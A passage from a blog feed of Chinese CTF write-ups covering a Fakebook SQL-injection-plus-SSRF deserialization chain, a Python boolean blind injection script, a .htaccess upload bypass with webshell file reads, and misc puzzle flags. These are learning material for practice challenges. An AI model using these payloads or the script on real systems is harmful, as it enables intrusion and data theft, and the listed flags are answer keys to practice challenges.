        <content type="html"><![CDATA[<p>ssrf和sql注入组合拳</p><span id="more"></span><h3 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h3><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308231135802.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308231135802.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308231135802"></p><p>简单注册一个测试账户，进入页面</p><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308231257903.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308231257903.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308231257903"></p><p>发现此处，猜测可能存在sql注入漏洞</p><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308231852788.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308231852788.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308231852788"></p><p>sqlmap 基本测试出no处存在sql注入漏洞，但是很遗憾并没有拿到数据，猜测一些关键字被过滤</p><p>访问一下robots.txt文件，有意外发现</p><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308232514380.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308232514380.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308232514380"></p><p>得到课user.php的源码备份文件</p><h3 id="0x02-源码分析"><a href="#0x02-源码分析" class="headerlink" title="0x02 源码分析"></a>0x02 源码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);  <span class="comment">//很明显这里存在SSRF漏洞</span></span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现给出的源码除了有SSRF漏洞之外并没有直接可控参入，于是这个题是一个灰盒测试题目</p><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308233532327.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308233532327.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308233532327"></p><p>此处应该调用 UserInfo类里的 getBlogContents函数</p><p>不妨再次对注入点进行测试</p><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308233833628.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308233833628.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308233833628"></p><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308233952457.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308233952457.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308233952457"></p><p>我们的猜测是正确的，而且该类是通过反序列化的方式调用的，/var/www/html 是网站根目录</p><p>因为2处回显点，通过sql注入可以拿到相关数据</p><blockquote><p>数据库名：fakebook 表名: users 列名:data</p></blockquote><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308234509329.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210308234509329.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210308234509329"></p><p>取出的数据是序列化的字符串，很明显反序列化的字符串数据被写入了数据库中，那不妨猜测这个功能相当于传入id，然后去数据库中查询到相关记录，并且将该数据反序列化，进行调用，于是我们可以构造exp了</p><h3 id="0x03-构造payload"><a href="#0x03-构造payload" class="headerlink" title="0x03  构造payload"></a>0x03  构造payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> UserInfo();</span><br><span class="line"><span class="variable">$a</span>-&gt;blog=<span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="string">&quot;hahaha&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>O:8:”UserInfo”:3:{s:4:”name”;s:6:”hahaha”;s:3:”age”;i:0;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}</p><blockquote><p><a href="http://3c8ee748-a9f9-46ee-99bf-f8af80d0e6eb.node3.buuoj.cn/view.php?no=-1%20union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:%7Bs:4:%22name%22;s:6:%22hahaha%22;s:3:%22age%22;i:0;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;%7D%27#">http://3c8ee748-a9f9-46ee-99bf-f8af80d0e6eb.node3.buuoj.cn/view.php?no=-1%20union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:6:%22hahaha%22;s:3:%22age%22;i:0;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27#</a></p></blockquote><p><img src="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210309000557569.png" class="lazyload" data-srcset="/2021/03/06/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/image-20210309000557569.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210309000557569"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CISCN2019 华北赛区 Day2 Web1]Hack World</title>
      <link href="2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/"/>
      <url>2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/</url>
      
        <content type="html"><![CDATA[<p>这个并不是一道难题，经过简单fuzz测试应该是可以搞出来的，由于经验缺乏，一时间还是没搞出来，其本质就是一个简单的bool盲注</p><span id="more"></span><h3 id="0x01-Fuzz-测试"><a href="#0x01-Fuzz-测试" class="headerlink" title="0x01 Fuzz 测试"></a>0x01 Fuzz 测试</h3><p><img src="/2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210306120300876.png" class="lazyload" data-srcset="/2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210306120300876.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306120300876"></p><p>测试  <code>&#39;</code></p><p><img src="/2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210306120359672.png" class="lazyload" data-srcset="/2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210306120359672.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306120359672"></p><p>发现其可能和bool盲注有关</p><p>fuzz一下</p><p><img src="/2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210306120449832.png" class="lazyload" data-srcset="/2021/03/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210306120449832.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306120449832"></p><p><strong>发现过滤了 union * 等，但是if() ascii char mid substr 等都未过滤</strong></p><h3 id="0x02-题解-bool盲注"><a href="#0x02-题解-bool盲注" class="headerlink" title="0x02 题解 bool盲注"></a>0x02 题解 bool盲注</h3><p><code>if(ascii(substr((select(flag)from(flag)),1,1))=ascii(&#39;f&#39;),1,2)</code> 如此构造即可 </p><p>if(ascii(substr((select    flag    from    flag),1,1))=ascii(‘f’),1,2)    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bool_injection</span>(<span class="params">url</span>):</span></span><br><span class="line">    base_str=<span class="string">&#x27;the_result_is:...&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="built_in">min</span>=<span class="number">30</span>;<span class="built_in">max</span>=<span class="number">127</span></span><br><span class="line">        mid=(<span class="built_in">min</span>+<span class="built_in">max</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">max</span>&gt;<span class="built_in">min</span>:</span><br><span class="line">            payload=<span class="string">&#x27;if(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;,1,2)&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">            &#125;</span><br><span class="line">            req=requests.post(url,data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                <span class="built_in">min</span>=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">max</span>=mid</span><br><span class="line">            mid=(<span class="built_in">min</span>+<span class="built_in">max</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        base_str=base_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(base_str)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> bool盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[MRCTF2020]你传你🐎呢</title>
      <link href="2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/"/>
      <url>2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/</url>
      
        <content type="html"><![CDATA[<p>很基础的双文件上传绕过,通过上传.htaccess使得全目录被当做php解析</p><span id="more"></span><p><img src="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314173514256.png" class="lazyload" data-srcset="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314173514256.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210314173514256"></p><p>上传正常图片</p><p><img src="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314173541892.png" class="lazyload" data-srcset="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314173541892.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210314173541892"></p><p>被过滤，猜测可能后端在校验时对文件大小也进行校验，导致正常图片过不了</p><p>如题目，上传图片马试试</p><p><img src="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314173726420.png" class="lazyload" data-srcset="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314173726420.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210314173726420"></p><p>图片马上传成功 但是不解析</p><p>尝试上传.htaccess    </p><p><img src="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314174013160.png" class="lazyload" data-srcset="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314174013160.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210314174013160"></p><p>成功解析，</p><p><img src="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314174048613.png" class="lazyload" data-srcset="/2021/03/04/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/image-20210314174048613.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210314174048613"></p><p>查看disabled function 发现如下函数被过滤</p><blockquote><p>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld</p></blockquote><p>基本过滤了命令执行所需函数，于是我们不进行命令执行仅仅进行文件读取</p><p>构造payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?M0th&#x3D;var_dump(scandir(&#39;&#x2F;&#39;)); 读取目录</span><br><span class="line">?M0th&#x3D;var_dump(file_get_contents(&#39;&#x2F;flag&#39;)); 读取flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 命令执行绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-misc的解题过程</title>
      <link href="2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/"/>
      <url>2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>刷一些misc，buu走起</p><span id="more"></span><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>签到题 flag{buu_ctf}</p><h3 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h3><p>gif逐帧播放即可</p><p><img src="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210303234245931.png" class="lazyload" data-srcset="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210303234245931.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210303234245931"></p><p><img src="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210303234155503.png" class="lazyload" data-srcset="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210303234155503.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210303234155503"></p><p>flag{he11ohongke}</p><h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>很简单 binwalk发现隐藏其他文件</p><p>foremost分离出来 一个zip</p><p>ziperello 爆破出密码 </p><p>得到flag</p><h3 id="N种解决办法"><a href="#N种解决办法" class="headerlink" title="N种解决办法"></a>N种解决办法</h3><p>winhex打开发现是data://协议的数据</p><p>浏览器访问一下</p><p><img src="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210304000435507.png" class="lazyload" data-srcset="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210304000435507.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210304000435507"></p><p>扫描得到KEY{dca57f966e4e4e31fd5b15417da63269}</p><h3 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h3><h4 id="考点，png文件格式，winhex修改宽高"><a href="#考点，png文件格式，winhex修改宽高" class="headerlink" title="考点，png文件格式，winhex修改宽高"></a>考点，png文件格式，winhex修改宽高</h4><p><img src="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306161014547.png" class="lazyload" data-srcset="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306161014547.png" 